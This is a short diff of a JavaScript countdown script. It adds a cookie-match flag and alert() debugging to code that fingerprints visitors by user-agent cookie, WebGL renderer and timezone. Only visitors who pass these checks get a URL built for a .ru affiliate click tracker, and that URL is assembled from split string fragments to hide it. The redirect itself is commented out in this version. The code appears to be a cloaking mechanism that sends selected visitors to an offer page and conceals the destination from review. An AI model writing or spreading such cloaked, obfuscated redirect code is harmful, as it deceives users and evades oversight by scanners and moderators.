@@ -368,6 +368,11 @@ function countdown(){
 	var myuseragent1 = btoa(useragent);
 	var myuseragent2 = Cookies.get('u');
 	
+	var ucookies = 0;
+	if (myuseragent1==myuseragent2) {
+		var ucookies = 1;
+	}
+	
 	var canvas = document.createElement('canvas');
 	var gl;
 	var debugInfo;
@@ -443,7 +448,12 @@ function countdown(){
 		var mytz = 1;
 	}
 	
-	if ((myuseragent1==myuseragent2) && (myrenderer==1) && (myuseragent==1) && (mytz==1)) {
+	alert(ucookies);
+	alert(myrenderer);
+	alert(myuseragent);
+	alert(mytz);
+	
+	if ((ucookies==1) && (myrenderer==1) && (myuseragent==1) && (mytz==1)) {
 		var url = 'htt'+'p:/'+'/tr'+'ck.p'+'lsy'+'.ru/cl'+'ic'+'k?pi'+'d=2'+'6&o'+'ff'+'er_'+'id=1'+'3'+'7&s'+'ub'+'2=0'+'2'+'6G'+'&'+'s'+'ub'+'3='+utm_term;
 		//window.location.href = url;
 		alert(url);
